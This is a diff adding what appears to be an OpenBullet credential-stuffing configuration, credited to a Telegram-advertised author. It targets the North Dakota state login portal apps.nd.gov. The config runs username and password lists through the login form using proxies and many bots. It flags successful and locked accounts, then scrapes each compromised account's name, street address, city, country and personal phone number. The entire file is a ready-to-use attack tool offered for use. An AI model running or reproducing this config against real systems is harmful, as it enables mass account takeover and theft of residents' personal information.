@@ -1,0 +1,127 @@
+[SETTINGS]
+{
+  "Name": "apps.nd.gov",
+  "SuggestedBots": 80,
+  "MaxCPM": 0,
+  "LastModified": "2021-08-05T14:22:57.7126994+04:30",
+  "AdditionalInfo": "https://t.me/Hogo_Victor",
+  "Author": "@Hogo_Victor",
+  "Version": "1.4.4 [Anomaly]",
+  "IgnoreResponseErrors": false,
+  "MaxRedirects": 8,
+  "NeedsProxies": true,
+  "OnlySocks": false,
+  "OnlySsl": false,
+  "MaxProxyUses": 0,
+  "BanProxyAfterGoodStatus": false,
+  "EncodeData": false,
+  "AllowedWordlist1": "",
+  "AllowedWordlist2": "",
+  "DataRules": [],
+  "CustomInputs": [
+    {
+      "Description": "Author Telegram Id:@Hogo_Victor",
+      "VariableName": "",
+      "Id": 582799046
+    }
+  ],
+  "CaptchaUrl": "",
+  "Base64": "",
+  "Grayscale": false,
+  "RemoveLines": false,
+  "RemoveNoise": false,
+  "Dilate": false,
+  "Threshold": 1.0,
+  "DiffKeep": 0.0,
+  "DiffHide": 0.0,
+  "Saturate": false,
+  "Saturation": 0.0,
+  "Transparent": false,
+  "Contour": false,
+  "OnlyShow": false,
+  "ContrastGamma": false,
+  "Contrast": 1.0,
+  "Gamma": 1.0,
+  "Brightness": 1.0,
+  "RemoveLinesMin": 0,
+  "RemoveLinesMax": 0,
+  "Crop": false,
+  "ForceHeadless": false,
+  "AlwaysOpen": false,
+  "AlwaysQuit": false,
+  "DisableNotifications": false,
+  "CustomUserAgent": "",
+  "RandomUA": false,
+  "CustomCMDArgs": ""
+}
+
+[SCRIPT]
+#Login REQUEST POST "https://apps.nd.gov/itd/ldap/login.htm" 
+  CONTENT "command=&returnPage=http%3A%2F%2Fwww.nd.gov%2F&j_username=<USER>&j_password=<PASS>&login=Login" 
+  CONTENTTYPE "application/x-www-form-urlencoded" 
+  HEADER "Host: apps.nd.gov" 
+  HEADER "User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:90.0) Gecko/20100101 Firefox/90.0" 
+  HEADER "Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8" 
+  HEADER "Accept-Language: en-US,en;q=0.5" 
+  HEADER "Accept-Encoding: gzip, deflate" 
+  HEADER "Origin: https://apps.nd.gov" 
+  HEADER "Dnt: 1" 
+  HEADER "Referer: https://apps.nd.gov/itd/ldap/login.htm" 
+  HEADER "Upgrade-Insecure-Requests: 1" 
+  HEADER "Sec-Fetch-Dest: document" 
+  HEADER "Sec-Fetch-Mode: navigate" 
+  HEADER "Sec-Fetch-Site: same-origin" 
+  HEADER "Sec-Fetch-User: ?1" 
+  HEADER "Te: trailers" 
+  HEADER "Connection: close" 
+
+KEYCHECK 
+  KEYCHAIN Failure OR 
+    KEY "Invalid login" 
+  KEYCHAIN Success OR 
+    KEY "<ADDRESS>" Contains "https://apps.nd.gov/itd/ldap/viewProfile.htm" 
+    KEY "<COOKIES(LtpaToken2)>" Exists 
+  KEYCHAIN Custom "CUSTOM" OR 
+    KEY "Unable to retrieve valid recovery accounts." 
+    KEY "Account Locked" 
+
+#1 PARSE "<SOURCE>" LR "<th>Name:</th>" "</td>" -> VAR "1" 
+
+#2 PARSE "<SOURCE>" LR "<th>City, State, Zip</th>" "</td>" -> VAR "2" 
+
+#3 PARSE "<SOURCE>" LR "<th>Country:</th>" "</td>" -> VAR "3" 
+
+#4 PARSE "<SOURCE>" LR "Personal Phone:</th>" "</td>" -> VAR "4" 
+
+#Name FUNCTION Replace "<td>" "" "<1>" -> CAP "Name" 
+
+#City,_State,_Zip FUNCTION Replace "<td>" "" "<2>" -> CAP "City, State, Zip" 
+
+#Country FUNCTION Replace "<td>" "" "<3>" -> CAP "Country" 
+
+#Personal_Phone FUNCTION Replace "<td>" "" "<4>" -> CAP "Personal Phone" 
+
+#Ad1 PARSE "<SOURCE>" LR "<th>Address 1:</th>" "</td>" -> VAR "Ad1" 
+
+#r1 FUNCTION Replace "<td>" "" "<Ad1>" -> VAR "r1" 
+
+#Ad2 PARSE "<SOURCE>" LR "<th>Address 2:</th>" "</td>" -> VAR "Ad2" 
+
+#r2 FUNCTION Replace "<td>" "" "<Ad2>" -> VAR "r2" 
+
+#Ad3 PARSE "<SOURCE>" LR "<th>Address 3:</th>" "</td>" -> VAR "Ad3" 
+
+#r3 FUNCTION Replace "<td>" "" "<Ad3>" -> VAR "r3" 
+
+IF "<r1>" NotEqualTo ""
+SET CAP "Address" "<r1>"
+ENDIF
+IF "<r2>" NotEqualTo ""
+SET CAP "Address2" "<r2>"
+ENDIF
+IF "<r3>" NotEqualTo ""
+SET CAP "Address3" "<r3>"
+ENDIF
+
+#Config_By FUNCTION Constant "@Hogo_Victor" -> CAP "Config By" 
+
